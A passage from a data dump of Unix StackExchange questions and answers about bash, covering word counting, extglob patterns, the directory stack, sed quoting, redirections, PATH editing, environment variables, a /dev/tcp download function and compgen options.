<p>Where <code>tr</code> replaces spaces with newlines, <code>grep</code> filters all resulting lines matching WORD and <code>wc</code> counts the remaining ones.</p>

<p>One can even save the <code>wc</code> part using the <code>-c</code> option of grep:</p>

<pre><code>$ tr ' ' '\n' &lt; FILE | grep -c WORD
</code></pre>

<p>The <code>-c</code> option is defined by POSIX.</p>

<p>If it is not guaranteed that there are spaces between the words, you have to use some other character (as delimiter) to replace. For example alternative <code>tr</code> parts are</p>

<pre><code>tr '""' '\n'
</code></pre>

<p>or</p>

<pre><code>tr ""'"" '\n'
</code></pre>

<p>if you want to replace double or single quotes. Of course, you can also use <code>tr</code> to replace multiple characters at once (think different kinds of whitespace and punctuation).</p>

<p>In case you need to count WORD but not prefixWORD, WORDsuffix or  prefixWORDsuffix, you can enclose the WORD pattern in begin/end-of-line markers:</p>

<pre><code>grep -c '^WORD$'
</code></pre>

<p>Which is equivalent to word-begin/end markers, in our context:</p>

<pre><code>grep -c '\&lt;WORD\&gt;'
</code></pre>
"
"Why does rm *(1)* remove all files in a directory?","120206","<bash><wildcards>","47","<p>From <code>man bash</code>:</p>

 

<pre class=""lang-none prettyprint-override""><code>*(pattern-list)
                 Matches zero or more occurrences of the given patterns
</code></pre>

<p>You have a glob expression which matches files beginning with zero or more <code>1</code>s - which is all files.</p>

<p>One simple way to disable this globbing behaviour is to <code>\</code> escape the parentheses:</p>

<pre class=""lang-none prettyprint-override""><code>rm *\(1\)*
</code></pre>

<p>Otherwise you can use <code>shopt -u extglob</code> to disable the behaviour and <code>shopt -s extglob</code> to re-enable it:</p>

<pre class=""lang-none prettyprint-override""><code>shopt -u extglob
rm *(1)*
shopt -s extglob
</code></pre>

<p>Note that as <a href=""https://unix.stackexchange.com/questions/120206/why-does-rm-1-remove-all-files-in-a-directory/120207#comment189149_120207"">Stephane says</a>, <code>extglob</code> is enabled by <code>bash-completion</code> so disabling it may cause completion functions not to work properly.</p>
"
"What is a fast command line way to switch between multiple directories for system administration?","286351","<bash><shell-script><administration>","47","<p>Use <code>pushd</code> and then the special names for the directories in your directory stack: <code>~1</code>, <code>~2</code>, etc.</p>

<p>Example:</p>

<pre><code>tmp $ dirs -v
 0  /tmp
 1  /tmp/scripts
 2  /tmp/photos
 3  /tmp/music
 4  /tmp/pictures
tmp $ cd ~3
music $ dirs -v
 0  /tmp/music
 1  /tmp/scripts
 2  /tmp/photos
 3  /tmp/music
 4  /tmp/pictures
music $ cd ~2
photos $ cd ~4
pictures $ cd ~3
music $ cd ~1
scripts $ 
</code></pre>

<p>The most effective way to use <code>pushd</code> in this way is to load up your directory list, then <em>add one more</em> directory to be your current directory, and then you can jump between the static numbers without affecting the position of the directories in your stack.</p>

<hr>

<p>It's also worth noting that <code>cd -</code> will take you to the last directory you were in.  <strong>So will <code>cd ~-</code>.</strong></p>

<p>The advantage of <code>~-</code> over just <code>-</code> is that <code>-</code> is specific to <code>cd</code>, whereas <code>~-</code> is expanded <em>by your shell</em> the same way that <code>~1</code>, <code>~2</code>, etc. are.  This comes in handy when copying a file between very long directory paths; e.g.:</p>

<pre><code>cd /very/long/path/to/some/directory/
cd /another/long/path/to/where/the/source/file/is/
cp myfile ~-
</code></pre>

<p>The above is equivalent to:</p>

<pre><code>cp /another/long/path/to/where/the/source/file/is/myfile /very/long/path/to/some/directory/
</code></pre>
"
"Slash and backslash in sed","211834","<bash><sed><quoting>","47","<p>Use single quotes for the expression you used:</p>

<pre><code>sed 's/\//\\\//g'
</code></pre>

<p>In double quotes, <code>\</code> has a special meaning, so you have to backslash it:</p>

<pre><code>sed ""s/\//\\\\\//g""
</code></pre>

<p>But it's cleaner to change the delimiter:</p>

<pre><code>sed 's=/=\\/=g'
sed ""s=/=\\\/=g""
</code></pre>
"
"how to download a file using just bash and nothing else (no curl, wget, perl, etc.)","83926","<bash><command-line><web>","47","<p>If you have bash 2.04 or above with the <code>/dev/tcp</code> pseudo-device enabled, you can download a file from bash itself.</p>

<p>Paste the following code directly into a bash shell (you don't need to save the code into a file for executing):</p>

<pre><code>function __wget() {
    : ${DEBUG:=0}
    local URL=$1
    local tag=""Connection: close""
    local mark=0

    if [ -z ""${URL}"" ]; then
        printf ""Usage: %s \""URL\"" [e.g.: %s http://www.google.com/]"" \
               ""${FUNCNAME[0]}"" ""${FUNCNAME[0]}""
        return 1;
    fi
    read proto server path &lt;&lt;&lt;$(echo ${URL//// })
    DOC=/${path// //}
    HOST=${server//:*}
    PORT=${server//*:}
    [[ x""${HOST}"" == x""${PORT}"" ]] &amp;&amp; PORT=80
    [[ $DEBUG -eq 1 ]] &amp;&amp; echo ""HOST=$HOST""
    [[ $DEBUG -eq 1 ]] &amp;&amp; echo ""PORT=$PORT""
    [[ $DEBUG -eq 1 ]] &amp;&amp; echo ""DOC =$DOC""

    exec 3&lt;&gt;/dev/tcp/${HOST}/$PORT
    echo -en ""GET ${DOC} HTTP/1.1\r\nHost: ${HOST}\r\n${tag}\r\n\r\n"" &gt;&amp;3
    while read line; do
        [[ $mark -eq 1 ]] &amp;&amp; echo $line
        if [[ ""${line}"" =~ ""${tag}"" ]]; then
            mark=1
        fi
    done &lt;&amp;3
    exec 3&gt;&amp;-
}
</code></pre>

<p>Then you can execute it as from the shell as follows:</p>

<pre><code>__wget http://example.iana.org/
</code></pre>

<p>Source: <a href=""https://superuser.com/users/168962/moreaki"">Moreaki</a>'s answer <a href=""https://superuser.com/questions/40545/upgrading-and-installing-packages-through-the-cygwin-command-line/496572#496572"">upgrading and installing packages through the cygwin command line?</a></p>

<p><strong>Update:</strong>
as mentioned in the comment, the approach outlined above is simplistic:</p>

<ul>
<li>the <code>read</code> will trashes backslashes and leading whitespace.</li>
<li>Bash can't deal with NUL bytes very nicely so binary files are out.  </li>
<li>unquoted <code>$line</code> will glob.</li>
</ul>
"
"What does ${1+""$@""} mean in a shell script, and how does it differ from ""$@""?","68484","<bash><shell><perl>","47","<p>That's for compatibility with the Bourne shell. The Bourne shell was an old shell that was first released with Unix version  7 in 1979 and was still common until the mid 90s as <code>/bin/sh</code> on most commercial Unices.</p>

<p>It is the ancestor of most <em>Bourne-like shells</em> like <code>ksh</code>, <code>bash</code> or <code>zsh</code>.</p>

<p>It had a few awkward features many of which have been fixed in <code>ksh</code> and the other shells and the new standard specification of <code>sh</code>, one of which is this:</p>

<p>With the Bourne shell (at least those variants where it has not been fixed): <code>""$@""</code> expands to one empty argument if the list of positional parameters is empty (<code>$# == 0</code>) instead of no argument at all.</p>

<p><code>${var+something}</code> expands to ""something"" unless <code>$var</code> is unset. It is clearly documented in all shells but hard to find in the <code>bash</code> documentation as you need to pay attention to this sentence:</p>

<blockquote>
  <p>When not performing substring expansion, using the forms documented below, bash tests for a parameter that is unset or null.  <strong>Omitting the colon results  in  a  test  only  for  a parameter that is unset</strong>.</p>
</blockquote>

<p>So <code>${1+""$@""}</code> expands to <code>""$@""</code> only if <code>$1</code> is set (<code>$# &gt; 0</code>) which works around that limitation of the Bourne shell.</p>

<p>Note that the Bourne shell is the only shell with that problem. Modern <code>sh</code>s (that is <code>sh</code> conforming to the POSIX specification of <code>sh</code> (which the Bourne shell is not)) don't have that issue. So you only need that if you need your code to work on very old systems where <code>/bin/sh</code> might be a Bourne shell instead of a standard shell (note that POSIX doesn't specify the location of the standard <code>sh</code>, so for instance on Solaris before Solaris 11, <code>/bin/sh</code> was still a Bourne shell (though did not have that particular issue) while the normal/standard <code>sh</code> was in another location (<code>/usr/xpg4/bin/sh</code>)).</p>

<p>There is a problem in that <code>perlrun</code> perldoc page in that <code>$0</code> is not quoted though.</p>

<p>See <a href=""http://www.in-ulm.de/~mascheck/various/bourne_args/"">http://www.in-ulm.de/~mascheck/various/bourne_args/</a> for more information.</p>
"
"Run a diff between local and remote files","144476","<bash><ssh><diff>","47","<pre><code>ssh user@remote_host &quot;cat remote_file.txt&quot; | diff - local_file.txt
</code></pre>
<p><a href=""https://web.archive.org/web/20160202175615/http://xmodulo.com/how-to-diff-remote-files-over-ssh.html"" rel=""nofollow noreferrer"">Source</a></p>
"
"What does the -e do in a bash shebang?","15998","<linux><bash>","46","<p>Your post actually contains 2 questions.</p>
<ol>
<li><p>The <code>-e</code> flag instructs the script to exit on error. <a href=""https://www.gnu.org/software/bash/manual/bash.html#Modifying-Shell-Behavior"" rel=""nofollow noreferrer"">More flags</a></p>
<p>If there is an error it will exit right away.</p>
</li>
<li><p>The <code>$?</code> is the exit status of the last command. In Linux an exit status of <code>0</code> means that the command was successful. Any other status would mean an error occurred.</p>
</li>
</ol>
<p>To apply these answers to your script:</p>
<pre><code>egrep &quot;^username&quot; /etc/passwd &gt;/dev/null
</code></pre>
<p>would look for the <code>username</code> in the <code>/etc/passwd</code> file.</p>
<ul>
<li><p>If it finds it then the exit status <code>$?</code> will be equal to <code>0</code>.</p>
</li>
<li><p>If it doesn't find it the exit status will be something else (not <code>0</code>). Here, you will want to execute the <code>echo &quot;doesn't exist&quot;</code> part of the code.</p>
</li>
</ul>
<p><strong>Unfortunately</strong> there is an error in your script, and you would execute that code <strong>if the user exists</strong> - change the line to</p>
<pre><code>if [ $? -ne 0 ]
</code></pre>
<p>to get the logic right.</p>
<p><strong>However</strong> if the user doesn't exist, <code>egrep</code> will return an error code, and due to the <code>-e</code> option the shell will immediately exit after that line, so you would never reach that part of the code.</p>
"
"Order of redirections","37660","<bash><shell><command-line><io-redirection><file-descriptors>","46","<p>I find it easier to think of using assignments.</p>

<ul>
<li><code>&gt;</code> is like <code>=</code></li>
<li><code>&amp;</code> is like <code>$</code></li>
</ul>

<p>You start out with</p>

<pre><code>1 = /dev/tty
2 = /dev/tty
</code></pre>

<p>then your first example, <code>1&gt; file.txt 2&gt;&amp;1</code>, does</p>

<pre><code>1 = file.txt
2 = $1           # and currently $1 = file.txt
</code></pre>

<p>leaving you with</p>

<pre><code>1 = file.txt
2 = file.txt
</code></pre>

<hr>

<p>If you did it the other way, again you start with</p>

<pre><code>1 = /dev/tty
2 = /dev/tty
</code></pre>

<p>then <code>2&gt;&amp;1 &gt; file.txt</code> does</p>

<pre><code>2 = $1           # and currently $1 = /dev/tty
1 = file.txt
</code></pre>

<p>so the end result is</p>

<pre><code>1 = file.txt
2 = /dev/tty
</code></pre>

<p>and you've only redirected <code>stdout</code>, not <code>stderr</code>.</p>
"
"How to replace one char with another in all filenames of the current directories?","19058","<linux><bash><rename>","46","<p>If you need to rename files in subdirectories as well, and your <code>find</code> supports the <code>-execdir</code> predicate, then you can do</p>

<pre><code>find /search/path -depth -name '* *' \
    -execdir bash -c 'mv -- ""$1"" ""${1// /_}""' bash {} \;
</code></pre>

<p>Thank to @glenn jackman for suggesting <code>-depth</code> option for <code>find</code> and to make me think.</p>

<p>Note that on some systems (including GNU/Linux ones), <code>find</code> may fail to find files whose name contains spaces and also sequences of bytes that don't form valid characters (typical with media files with names with non-ASCII characters encoded in a charset different from the locale's). Setting the locale to <code>C</code> (as in <code>LC_ALL=C find...</code>) would address the problem.</p>
"
"Checking if an input number is an integer","151654","<bash><regular-expression><quoting><test>","46","<p>Remove quotes</p>

<pre><code>if ! [[ ""$scale"" =~ ^[0-9]+$ ]]
    then
        echo ""Sorry integers only""
fi
</code></pre>
"
"Why would anyone not set 'histappend' in bash?","6501","<bash><command-history>","46","<p>Well, when <code>histappend</code> is not set, this does not mean that the history is wiped on each shell exit. Without <code>histappend</code> bash reads the histfile on startup into memory - during operation new entries are added - and on shell exit the last HISTSIZE lines are written to the history file without appending, i.e. replacing the previous content.</p>

<p>For example, if the histfile contains 400 entries, during bash runtime 10 new entries are added - histsize is set to 500, then the new histfile contains 410 entries.</p>

<p>This behavior is only problematic if you use more bash instances in parallel. In that case, the history file only contains the contents of the last exiting shell.</p>

<p>Independent of this: There are some people who want to wipe their history on shell exit because of privacy reasons.</p>
"
"How to Extract Album Cover Image from MP3 file?","41287","<bash><images><mp3>","46","<p>You can use <a href=""http://eyed3.nicfit.net/"">eyed3</a> which is a great utility for handling id3 tags. To extract all images from an mp3 file you can use:</p>

<pre><code>eyeD3 --write-images=DIR mp3_file
</code></pre>

<p>This will write all embedded images from the mp3 file to the specified directory.</p>
"
"Removing a directory from PATH","108873","<bash><shell><environment-variables><path>","45","<p>There are no standard tools to ""edit"" the value of $PATH (i.e. ""add folder only when it doesn't already exists"" or ""remove this folder"").
You just execute:</p>

<pre><code>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
</code></pre>

<p>that would be for the current session, if you want to change permanently add it to any .bashrc, bash.bashrc, /etc/profile - whatever fits your system and user needs.
However if you're using BASH, you can also do the following if, let's say, you want to remove the directory <code>/home/wrong/dir/</code> from your PATH variable, assuming it's at the end:</p>

<pre><code>PATH=$(echo ""$PATH"" | sed -e 's/:\/home\/wrong\/dir$//')
</code></pre>

<p>So  in your case you may use</p>

<pre><code>PATH=$(echo ""$PATH"" | sed -e 's/:\/d\/Programme\/cygwin\/bin$//')
</code></pre>
"
"""not a valid identifier"" when I do ""export $PATH""","79658","<bash><shell><environment-variables>","45","<p>Running <code>export $PATH</code> will try to export a variable with a name equal to the <strong>value</strong> of <code>$PATH</code> (after <a href=""https://mywiki.wooledge.org/WordSplitting"" rel=""noreferrer"">word splitting</a>). That is, it's equivalent to writing something like <code>export /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code>. And since <code>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code> is not a valid variable name, it fails. <strong>What you want to do is <code>export PATH</code>.</strong></p>

<p><a href=""https://mywiki.wooledge.org/BashGuide/Parameters#Variable_Types"" rel=""noreferrer""><code>export</code></a> (equivalent to <code>declare -x</code>) in Bash simply makes the variable available to subshells.</p>

<p>To print the value of a variable safely and readably, use <code>printf %q ""$PATH""</code>.</p>
"
"How does `cat <> file` work?","164391","<bash><shell><io-redirection>","45","<p>Bash uses <code>&lt;&gt;</code> to create <a href=""https://www.gnu.org/software/bash/manual/bashref.html#Opening-File-Descriptors-for-Reading-and-Writing"">a read-write file descriptor</a>:</p>

<blockquote>
  <p>The redirection operator</p>

<pre><code>[n]&lt;&gt;word
</code></pre>
  
  <p>causes the file whose name is the expansion of word to be opened for both reading and writing on file descriptor n, or on file descriptor 0 if n is not specified. If the file does not exist, it is created.</p>
</blockquote>

<p><code>cat &lt;&gt; file</code> opens <code>file</code> read-write and binds it to descriptor 0 (standard input). It's essentially equivalent to <code>&lt; file</code> for any sensibly-written program, since nobody's likely to try writing to standard input ordinarily, but if one did it'd be able to.</p>

<p>You can write a simple C program to test that out directly - <code>write(0, ""hello"", 6)</code> will write <code>hello</code> into <code>file</code> via standard input.</p>

<p><code>&lt;&gt;</code> should <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_07_07"">also work in any other POSIX-compliant shell</a> with the same effect.</p>
"
"`Syntax error: ""("" unexpected` when creating an array","253892","<bash><shell-script><array>","45","<p>When you use <code>./scriptname.sh</code> it executes with <code>/bin/bash</code> as in the first line with <code>#!</code>. But when you use <code>sh scriptname.sh</code> it executes <code>sh</code>, not <code>bash</code>.</p>

<p>The <code>sh</code> shell has no syntax to create arrays, but Bash has the syntax you used.</p>
"
"How to define a shell script to be sourced not run","424492","<bash><shell>","44","<p>Assuming that you are running bash, put the following code near the start of the script that you want to be sourced but not executed:</p>

<pre><code>if [ ""${BASH_SOURCE[0]}"" -ef ""$0"" ]
then
    echo ""Hey, you should source this script, not execute it!""
    exit 1
fi
</code></pre>

<p>Under bash, <code>${BASH_SOURCE[0]}</code> will contain the name of the current file that the shell is reading regardless of whether it is being sourced or executed.</p>

<p>By contrast, <code>$0</code> is the name of the current file being executed.</p>

<p><code>-ef</code> tests if these two files are the same file.  If they are, we alert the user and exit.</p>

<p>Neither <code>-ef</code> nor <code>BASH_SOURCE</code> are POSIX. While <code>-ef</code> is supported by ksh, yash, zsh and Dash, <code>BASH_SOURCE</code> requires bash.  <a href=""https://stackoverflow.com/questions/9901210/bash-source0-equivalent-in-zsh"">In <code>zsh</code></a>, however, <code>${BASH_SOURCE[0]}</code> could be replaced by <code>${(%):-%N}</code>.</p>
"
"Which shell am I running on?","96305","<bash><tcsh>","44","<p><code>$SHELL</code> is not necessarily your current shell, it is the <a href=""http://tldp.org/LDP/abs/html/internalvariables.html#SHELLVARREF"">default login shell</a>. To check the shell you are using, try </p>

<pre><code>ps $$
</code></pre>

<p>This should work on most recent Unix/Linux with a <code>ps</code> that supports the BSD syntax. Otherwise, this is the portable (POSIX) way</p>

<pre><code>ps -p $$
</code></pre>

<p>That should return something like this if you are running <code>tcsh</code>:</p>

<pre><code>8773 pts/10   00:00:00 tcsh
</code></pre>

<p>If you want to have <code>tcsh</code> be your default shell, use <code>chsh</code> to set it.</p>
"
"Resolving MAC Address from IP Address in Linux","120153","<linux><bash><mac-address>","44","<p>If you just want to find out the MAC address of a given IP address you can use the command <code>arp</code> to look it up, once you've pinged the system 1 time.</p>

<h3>Example</h3>

<pre><code>$ ping skinner -c 1
PING skinner.bubba.net (192.168.1.3) 56(84) bytes of data.
64 bytes from skinner.bubba.net (192.168.1.3): icmp_seq=1 ttl=64 time=3.09 ms

--- skinner.bubba.net ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 3.097/3.097/3.097/0.000 ms
</code></pre>

<p>Now look up in the ARP table:</p>

<pre><code>$ arp -a
skinner.bubba.net (192.168.1.3) at 00:19:d1:e8:4c:95 [ether] on wlp3s0
</code></pre>

<h3>fing</h3>

<p>If you want to sweep the entire LAN for MAC addresses you can use the command line tool <code>fing</code> to do so. It's typically not installed so you'll have to go download it and install it manually.</p>

<pre><code>$ sudo fing 10.9.8.0/24
</code></pre>

<p>&nbsp;&nbsp;&nbsp; <img src=""https://i.stack.imgur.com/0v6Yb.png"" alt=""fing example""></p>

<h3>Using ip</h3>

<p>If you find you don't have the <code>arp</code> or <code>fing</code> commands available, you could use iproute2's command <code>ip neigh</code> to see your system's ARP table instead:</p>

<pre><code>$ ip neigh
192.168.1.61 dev eth0 lladdr b8:27:eb:87:74:11 REACHABLE
192.168.1.70 dev eth0 lladdr 30:b5:c2:3d:6c:37 STALE
192.168.1.95 dev eth0 lladdr f0:18:98:1d:26:e2 REACHABLE
192.168.1.2 dev eth0 lladdr 14:cc:20:d4:56:2a STALE
192.168.1.10 dev eth0 lladdr 00:22:15:91:c1:2d REACHABLE
</code></pre>

<h3>References</h3>

<ul>
<li><a href=""https://unix.stackexchange.com/questions/96700/equivalent-of-iwlist-to-see-who-is-around/96707#96707"">Equivalent of iwlist to see who is around?</a></li>
</ul>
"
"Terminal autocomplete: cycle through suggestions","24419","<bash><autocomplete>","44","<p>This is actually a readline feature called <code>menu-complete</code> . You can bind it to tab (replacing the default <code>complete</code>) by running:</p>

<pre><code>bind TAB:menu-complete
</code></pre>

<p>You probably want to add that to your <code>~/.bashrc</code>. Alternatively, you could configure it for all readline completions (not just bash) in <code>~/.inputrc</code>.</p>

<p>You may also find <code>bind -p</code> (show current bindings, note that shows tab as <code>""\C-i""</code>) and <code>bind -l</code> (list all functions that can be bound) useful, as well as the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Command-Line-Editing"">bash manual's line editing section</a> and <a href=""http://cnswww.cns.cwru.edu/php/chet/readline/rltop.html#Documentation"">readline's documentation</a>.</p>
"
"How to get IP Address using shell script?","119269","<bash><shell><ubuntu><shell-script><bash-script>","44","<p>To list all IP addresses, regardless of name, try this:</p>

<pre><code>ifconfig | perl -nle 's/dr:(\S+)/print $1/e'
</code></pre>

<p>or:</p>

<pre><code>ifconfig | awk '/inet addr/{print substr($2,6)}'
</code></pre>

<p>Specify the interface name (e.g. eth0) right after <code>ifconfig</code> if you only want the IP of a specific interface:</p>

<pre><code>ifconfig eth0 | perl -nle 's/dr:(\S+)/print $1/e'
</code></pre>

<p>or:</p>

<pre><code>ifconfig eth0 | awk '/inet addr/{print substr($2,6)}'
</code></pre>
"
"Object-oriented shell for *nix","4495","<bash><shell><scripting><architecture>","43","<p>I can think of three desirable features in a shell:</p>

<ul>
<li>Interactive usability: common commands should be quick to type; completion; ...</li>
<li>Programming: data structures; concurrency (jobs, pipe, ...); ...</li>
<li>System access: working with files, processes, windows, databases, system configuration, ...</li>
</ul>

<p>Unix shells tend to concentrate on the interactive aspect and subcontract most of the system access and some of the programming to external tools, such as:</p>

<ul>
<li><a href=""http://en.wikipedia.org/wiki/Bc_programming_language"" rel=""noreferrer"">bc</a> for simple math</li>
<li><a href=""http://www.openssl.org/"" rel=""noreferrer"">openssl</a> for cryptography</li>
<li><a href=""http://en.wikipedia.org/wiki/Sed"" rel=""noreferrer"">sed</a>, <a href=""http://en.wikipedia.org/wiki/AWK"" rel=""noreferrer"">awk</a> and others for text processing</li>
<li><a href=""http://en.wikipedia.org/wiki/Netcat"" rel=""noreferrer"">nc</a> for basic TCP/IP networking</li>
<li><code>ftp</code> for FTP</li>
<li><code>mail</code>, <code>Mail</code>, <code>mailx</code>, etc. for basic e-mail</li>
<li><code>cron</code> for scheduled tasks</li>
<li><a href=""http://tomas.styblo.name/wmctrl/"" rel=""noreferrer"">wmctrl</a> for basic X window manipulation</li>
<li><a href=""http://api.kde.org/3.5-api/kdelibs-apidocs/dcop/html/index.html"" rel=""noreferrer"">dcop</a> for KDE ≤3.x libraries</li>
<li><a href=""http://www.freedesktop.org/wiki/Software/dbus"" rel=""noreferrer"">dbus</a> tools (<code>dbus-*</code> or <a href=""http://doc.trolltech.com/4.2/qdbus.html"" rel=""noreferrer"">qdbus</a>) for various system information and configuration tasks (including modern desktop environments such as KDE ≥4)</li>
</ul>

<p>Many, many things can be done by invoking a command with the right arguments or piped input. This is a very powerful approach — better have one tool per task that does it well, than a single program that does everything but badly — but it does have its limitations.</p>

<p>A major limitation of unix shells, and I suspect this is what you're after with your “object-oriented scripting” requirement, is that they are not good at retaining information from one command to the next, or combining commands in ways fancier than a pipeline. In particular, inter-program communication is text-based, so applications can only be combined if they serialize their data in a compatible way. This is both a blessing and a curse: the everything-is-text approach makes it easy to accomplish simple tasks quickly, but raises the barrier for more complex tasks.</p>

<p>Interactive usability also runs rather against program maintainability. Interactive programs should be short, require little quoting, not bother you with variable declarations or typing, etc. Maintainable programs should be readable (so not have many abbreviations), should be readable (so you don't have to wonder whether a bare word is a string, a function name, a variable name, etc.), should have consistency checks such as variable declarations and typing, etc.</p>

<p>In summary, a shell is a difficult compromise to reach. Ok, this ends the rant section, on to the examples.</p>

<hr>

<ul>
<li><p>The <a href=""http://www.focusresearch.com/gregor/sw/psh/"" rel=""noreferrer""><strong>Perl Shell (psh)</strong></a> “combines the interactive nature of a Unix shell with the power of Perl”. Simple commands (even pipelines) can be entered in shell syntax; everything else is Perl. The project hasn't been in development for a long time. It's usable, but hasn't reached the point where I'd consider using it over pure Perl (for scripting) or pure shell (interactively or for scripting).</p></li>
<li><p><a href=""http://ipython.scipy.org/"" rel=""noreferrer""><strong>IPython</strong></a> is an improved interactive Python console, particularly targetted at numerical and parallel computing. This is a relatively young project.</p></li>
<li><p><a href=""http://ruby-doc.org/docs/ProgrammingRuby/html/irb.html"" rel=""noreferrer""><strong>irb (interactive ruby)</strong></a> is the Ruby equivalent of the Python console.</p></li>
<li><p><a href=""http://www.scsh.net/"" rel=""noreferrer""><strong>scsh</strong></a> is a scheme implementation (i.e. a decent programming language) with the kind of system bindings traditionally found in unix shells (strings, processes, files). It doesn't aim to be usable as an interactive shell however.</p></li>
<li><p><a href=""http://www.zsh.org/"" rel=""noreferrer""><strong>zsh</strong></a> is an improved interactive shell. Its strong point is interactivity (command line edition, completion, common tasks accomplished with terse but cryptic syntax). Its programming features aren't that great (on par with ksh), but it comes with a number of libraries for terminal control, regexps, networking, etc.</p></li>
<li><p><a href=""http://fishshell.com/"" rel=""noreferrer""><strong>fish</strong></a> is a clean start at a unix-style shell. It doesn't have better programming or system access features. Because it breaks compatibility with sh, it has more room to evolve better features, but that hasn't happened.</p></li>
</ul>

<hr>

<p>Addendum: another part of the unix toolbox is treating many things as files:</p>

<ul>
<li>Most hardware devices are accessible as files.</li>
<li>Under Linux, <code>/sys</code> provides more hardware and system control.</li>
<li>On many unix variants, process control can be done through the <code>/proc</code> filesystem.</li>
<li><a href=""http://fuse.sourceforge.net/"" rel=""noreferrer"">FUSE</a> makes it easy to write new filesystems. There are already existing filesystems for converting file formats on the fly, accessing files over various network protocols, looking inside archives, etc.</li>
</ul>

<p>Maybe the future of unix shells is not better system access through commands (and better control structures to combine commands) but better system access through filesystems (which combine somewhat differently — I don't think we've worked out what the key idioms (like the shell pipe) are yet).</p>
"
"removing or clearing stack of popd/pushd paths","31248","<bash><pushd>","43","<p><code>dirs -c</code> is what you are looking for.</p>
"
"What exactly is an environment variable?","91282","<bash><shell><environment-variables>","43","<p>An environment is not as magical as it might seem. The shell stores it in memory and passes to the <code>execve()</code> system call. The child process inherits it as an array pointer called <code>environ</code>. From the <code>execve</code> manpage:</p>

<blockquote>
  <p>SYNOPSIS</p>

<pre><code>   #include &lt;unistd.h&gt;

   int execve(const char *filename, char *const argv[],
              char *const envp[]);
</code></pre>
  
  <p><code>argv</code> is  an  array  of argument strings passed to the new program.<br>
  By convention, the first of these strings should contain the filename 
  associated with the file being executed. <code>envp</code> is an array of strings,
  conventionally of the form key=value, which are passed as environment
  to  the new program.</p>
</blockquote>

<p>The <code>environ(7)</code> manpage also offers some insight:</p>

<blockquote>
  <p>SYNOPSIS</p>

<pre><code>   extern char **environ;
</code></pre>
  
  <p>DESCRIPTION</p>
  
  <p>The  variable  <code>environ</code> points  to  an array of pointers to strings
  called the ""environment"".  The last pointer in this array has the
  value <code>NULL</code>.  (This variable must be declared in the user program, 
  but is declared in the header file <code>&lt;unistd.h&gt;</code> in case the
  header files came from libc4 or libc5, and in case they came from 
  glibc and _GNU_SOURCE was defined.)  This array of strings is made
  available to the process by the exec(3) call that started the process.</p>
</blockquote>

<p>Both of these GNU manpages match the <a href=""http://pubs.opengroup.org/onlinepubs/009695399/basedefs/xbd_chap08.html"">POSIX specification</a></p>
"
"How can I delete all files with a particular extension in a particular folder?","42020","<bash><shell><directory><rm>","43","<p>Yes, <code>rm *.xvg</code> will <em>only</em> delete the files with the specified extension in your <em>current</em> directory.</p>

<p>A <em>good</em> way to make sure you are indeed in the directory you want delete your files is to use the <code>pwd</code> command which will display your current directory and then do an <code>ls</code> to verify you find the files you are expecting.</p>

<p>If you are bit apprehensive about issuing the <code>rm</code> command, there are 2 things you can do:</p>

<ol>
<li><p>type <code>ls *.xvg</code> to see a list of what files would be affected by this command.</p></li>
<li><p>Unless you have a <em>lot</em> of files, you could always also use the <code>-i</code> command line switch for <code>rm</code> (also exists for <code>cp</code> and <code>mv</code>). Using <code>rm -i *.xvg</code> would prompt you for each individual file if it was ok to delete it, so you could be sure nothing you didn't expect was getting deleted. (This will be tedious if you have a lot of files though :)</p></li>
</ol>
"
"How to SSH into a specific directory?","86941","<bash><ssh>","43","<p>Just put as the last line of your ~bob/.bash_profile file on foo:</p>

<pre><code>cd /home/guest &gt;&amp; /dev/null
</code></pre>

<p>Now each time you log in (whether by SSH or otherwise), the cd command will run. No mucking around with ssh is necessary.</p>

<p>I know you wrote that you'd ""like to avoid changing anything on 'foo' if possible,"" but if the bob@foo account is yours, changing your own .bash_profile should be acceptable, no?</p>
"
"Execute bash scripts on entering a directory","21363","<bash><shell-script><cd-command>","43","<p>You can make <code>cd</code> a function (and <code>pop</code> and <code>pushd</code>), and make it detect if you enter that particular directory.</p>

<pre><code>cd () { builtin cd ""$@"" &amp;&amp; chpwd; }
pushd () { builtin pushd ""$@"" &amp;&amp; chpwd; }
popd () { builtin popd ""$@"" &amp;&amp; chpwd; }
unset_all_project_settings () {
  # do whatever it takes to undo the effect of projectSettings.bash,
  # e.g. unset variables, remove PATH elements, etc.
}
chpwd () {
  case $PWD in
    /some/directory|/some/other/directory) . ./projectSettings.bash;;
    *) unset_all_project_settings;;
  esac
}
</code></pre>

<p>Do not do this in directories that you haven't whitelisted, because it would make it very easy for someone to trick you into running arbitrary code — send you an archive, so you unzip it, change into the directory it created, and you've now run the attacker's code.</p>

<p>I don't recommend this approach, because it means the script will be executed even if you enter that directory for some reason that's unrelated to working on the project. I suggest having a specific function that changes to the project directory and sources the settings script.</p>

<pre><code>myproj () {
  cd /some/directory &amp;&amp; . ./projectSettings.bash
}
</code></pre>
"
"Understand `compgen` builtin command","151118","<bash><documentation><shell-builtin><compgen>","43","

<p>Options for <code>compgen</code> command are the same as <code>complete</code>, except <code>-p</code> and <code>-r</code>. From <code>compgen</code> man page:</p>

<pre class=""lang-none prettyprint-override""><code>compgen
 compgen [option] [word]
 Generate possible completion matches for word according to the options, which 
 may be any option accepted by the complete builtin with the exception of -p 
 and -r, and write the matches to the standard output
</code></pre>

<p>For options <code>[abcdefgjksuv]</code>:</p>

<ul>
<li><code>-a</code> means Names of alias</li>
<li><code>-b</code> means Names of shell builtins</li>
<li><code>-c</code> means Names of all commands</li>
<li><code>-d</code> means Names of directory</li>
<li><code>-e</code> means Names of exported shell variables</li>
<li><code>-f</code> means Names of file and functions</li>
<li><code>-g</code> means Names of groups</li>
<li><code>-j</code> means Names of job</li>
<li><code>-k</code> means Names of Shell reserved words</li>
<li><code>-s</code> means Names of service</li>
<li><code>-u</code> means Names of userAlias names</li>
<li><code>-v</code> means Names of shell variables</li>
</ul>

<p>You can see complete man page <a href=""https://www.gnu.org/software/bash/manual/html_node/Programmable-Completion-Builtins.html"" rel=""noreferrer"">here</a>.</p>
"
